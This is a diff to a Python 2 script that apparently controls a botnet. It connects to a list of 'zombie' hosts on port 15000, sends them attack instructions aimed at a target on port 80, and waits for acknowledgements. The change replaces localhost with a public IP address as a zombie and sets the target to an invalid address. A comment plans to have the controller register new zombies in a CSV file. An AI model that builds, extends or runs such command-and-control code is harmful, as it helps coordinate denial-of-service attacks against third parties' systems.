@@ -2,10 +2,12 @@ import socket
 import time
 import sys
 
-ZOMBIES = ["localhost"]
+# Possible addition: Have the control server listen on a port for zombies to add, registers them
+# In a CSV, reads the CSV on attack
+ZOMBIES = ["69.91.152.47"]
 PORT = 15000
 TIMEOUT = 10000
-TARGET = ""
+TARGET = "1000.123321.3241"
 TARGET_PORT = 80
 
 for zombie in ZOMBIES:
@@ -16,10 +18,9 @@ for zombie in ZOMBIES:
             sock.connect((zombie, PORT))
             sock.sendall(data + "\n")
             rec = sock.recv(1024)
-            print "After connect"
-            print rec
             if rec == "ACK":
                 sock.close()
+                print "Zombie: {0} initiated".format(zombie)
                 break
         except:
             print sys.exc_info()[0]
